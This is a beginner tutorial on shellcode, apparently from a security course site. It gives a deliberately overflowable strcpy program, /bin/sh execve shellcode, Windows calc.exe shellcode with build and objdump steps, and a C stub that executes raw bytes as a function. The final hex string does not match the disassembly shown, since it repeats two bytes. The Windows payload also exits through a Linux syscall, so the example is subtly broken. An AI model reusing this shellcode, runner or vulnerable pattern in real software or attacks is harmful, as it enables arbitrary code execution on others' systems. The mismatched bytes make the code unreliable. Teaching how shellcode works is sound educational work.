

In a nutshell, shellcode is a small piece of code used as a payload for exploitation of software.

Typically, shellcode is written in assembly language and is desgined to be injected into memory. Its primary use is arbitrary code execution however it can be used for other functions

The purpose of using shellcode is to gain control of a system by injecting the said shellcode into the vulnerable process. It is usually carefully constructed and designed specifically for the individual attack it accomplishes. This is important because a lot of the time, shellcode must be refined per system.


To explain how shellcode works I first need to provide you with an exploitable program. For this we will use a basic program that is vulnerable to a buffer overflow due to not checking lengths passed. The code is below:

Copy

```
#include <stdio.h>
#include <string.h>


void no_length_check_function(char *input) {
    // add a buffer
    char buffer[100];
    // do not check the length of the input and copy
    strcpy(buffer, input);
}

// create the 'entrypoint' for the program that takes argc (argument count) and argv (argument variables) as the arguments 
int main(int argc, char *argv[]) {
    // pass the first argv (argv[1]) which will be the second argument IE: file.exe ARGUMENT1 to the vulnerable function
    no_length_check_function(argv[1]);
    // return becuase it's an int
    return 0;
}
```


When compiled this program allows an attacker to control the EIP (Next instruction pointer) by passing more than 100 characters as the argurment. We can create a pseudo shellcode to overwrite the EIP with the following 

```
xor eax, eax        ;"\x31\xc0"             
push eax            ;"\x50"                  
push "//sh"         ;"\x68\x2f\x2f\x73\x68"  
push "/bin"         ;"\x68\x2f\x62\x69\x6e"  
mov ebx, esp        ;"\x89\xe3"              
push eax            ;"\x50"                  
push ebx            ;"\x53"                  
mov ecx, esp        ;"\x89\xe1"              
cdq                 ;"\x99"                  
mov al, 0xb         ;(execve syscall number) ;"\xb0\x0b"              
int 0x80            ;(trigger syscall) ;"\xcd\x80"              
```

In theory what would happen is the following:

- The attacker fills the buffer; in this case it is 100 characters with whatever they want. In the scenario you could easily fill the buffer using something like `python -c 'print("A"*100)'`.
    
- The attacker overwrites the return address or EIP to point to the location of their shellcode.
    
- The overwritten EIP address now contains the shellcode address and the shellcode is executed.
    

It is important to note this explanation will most likely not be able to be compiled and most likely will not work. This is a pseudo example designed to explain to you how shellcode works and why it works.



For some reason during this process i was having trouble using nasm to compile my assembly so 

$env:PATH += ";C:\Program Files\NASM"


do this in your powershell session



## 

Let's write some shellcode!

Now that you have got the basic idea, we will start writing our own. We will write a basic assembly program to launch calc.exe. We will then convert the assembly into shellcode and call it through a C program. Let's get started:

Copy

```
section .text
    global _start

_start:
    ; push a null terminated string containing 'calc.exe' onto the stack
    xor    eax, eax
    push   eax 
    push   0x6578652e  ; "exe."
    push   0x636c6163  ; "calc"
    mov    ebx, esp

    ; get WinExec address from kernel32.dll (typical system might be different for your system)
    mov    eax, 0x76c76360
    
    push   1
    push   ebx  ; "calc.exe"
    call   eax  ; call WinExec(lpCmdLine="calc.exe", SW_SHOWNORMAL)

    ; exit cleanly
    xor    eax, eax
    push   eax
    mov    al, 0x1
    int    0x80 
```

Now that we have this shellcode what we need to do is compile it. To do so you will need two things:

1. [NASM](https://www.nasm.us/) -> NASM is an assembler/disassembler for the Intel x86 architecture.
    
2. [MinGW](https://www.mingw-w64.org/downloads/) -> MinGW is "Minimalist Gnu for Windows" and provides you with commands like gcc on Windows.
    

You can download both using Chocolatey or the respective links included above. Once you have these installed make sure to add them both to your ENV Path.

---

## 

[](https://bible.malcore.io/readme/the-beginning/introduction-to-shellcode#compiling-it)

Compiling it!

Now that you have what you need, we can continue with the compilation. What we need to do first is compile the shellcode into an object (`.o`) file. Save the above code into `test_calc.asm` and follow the below steps:

1. Compile the assembly using the `nasm` command:
    

Copy

```
nasm -f win32 .\test_calc.asm -o test_calc.o
```

You should get no output from this command indicating that you just compiled assembly successfully. What we just did was compile the raw assembly file into `win32` (`-f win32`) format and create the object file named `test_calc.o` (`-o test_calc.o`).

1. Link the object file using the `gcc` command:
    

**NOTE: This command may be different dependent on your system and architecture**

Copy

```
gcc -m32 -o test_calc.exe .\test_calc.o "-Wl,-e,_start" -nostdlib
```

What the above commands does is tells the `gcc` compiler to link the output as a 32bit (`-m32`) application, specifies the entrypoint to the `_start` section (`-Wl,_-e,_start`), and prevents us from including standard libraries (`-nostdlib`). Congratulations! You have successfully compiled your own shellcode!

Wait but. This isnt giving us hex format.

If this is the first time you've done this, you're probably thinking: "Well that's cool but it's not in the normal '\xnn' format I see all the time" and you are completely right! That is because we have not taken our shellcode and turned it into the correct format we need! If you see the above you notice that we compiled the shellcode into an `exe` file at the end which is great and awesome! But we don't need to complete that step in order to get the shellcode. What we need is the `object` file, and the disassembly of that file. We can get this using something like `objdump` on the object file:

Copy

```
PS C:\Users\xxx> objdump -d .\test_calc.o

.\test_calc.o:     file format pe-i386


Disassembly of section .text:

00000000 <_start>:
   0:   31 c0                   xor    %eax,%eax
   2:   50                      push   %eax
   3:   68 2e 65 78 65          push   $0x6578652e
   8:   68 63 61 6c 63          push   $0x636c6163
   d:   89 e3                   mov    %esp,%ebx
   f:   b8 60 63 c7 76          mov    $0x76c76360,%eax
  14:   6a 01                   push   $0x1
  16:   53                      push   %ebx
  17:   ff d0                   call   *%eax
  19:   31 c0                   xor    %eax,%eax
  1b:   50                      push   %eax
  1c:   b0 01                   mov    $0x1,%al
  1e:   cd 80                   int    $0x80
```


We copy the actual HEX memory on the left of these assembly instructions 
Now we can convert the above to the correct format by copying the opcodes and converting them into the `\xnn` format like so:

Copy

```
\x31\xc0\x50\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\xb8\x60\x63\xc7\x76\x6a\x01\x53\xff\xd0\x31\xc0\x50\xb0\x01\xb0\x01\xcd\x80
```

You're probably thinking: "my fucking God there has to be a better way" and yes there is! However, it is important that you understand how all this takes place before looking for the shortcuts. Now that we have the correct format the most common way to run shellcode is by inserting it into a file call. We will use C for this:

Copy

```
unsigned char code[] = "\x31\xc0\x50\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\xb8\x60\x63\xc7\x76\x6a\x01\x53\xff\xd0\x31\xc0\x50\xb0\x01\xb0\x01\xcd\x80";

int main (void) {
    (*(void(*)()) code)();
}
```

The above C code calls the `unsigned char` variable as a function and runs it directly, in a nutshell this part of the function: `(*(void(*)()) code)();` is a type cast to treat the code as a function pointer without any arguments. This allows us to execute the shellcode without need for injection into a vulnerable process.

---

## 

[](https://bible.malcore.io/readme/the-beginning/introduction-to-shellcode#in-closing)

In closing

This course has provided you with the basics of how shellcode works, how to compile it, and how to launch it from within a C program. This course was designed specifically for starters to understand the basic concepts of shellcode and what it does. We hope you have found this course useful and understand it.

There is a high probability that this shellcode will not launch calc.exe on your system, that is most likely because the hardcoded address of WinExec (`0x76c76360`) is incorrect. To fix this you will need to perform actions such as `LoadLibraryA` and find the correct location of the addresses. Unfortunately, that is out of scope for this introduction and will need to be shown later. We encourage readers to try and figure this out themselves.



https://bible.malcore.io/readme/the-beginning/introduction-to-python


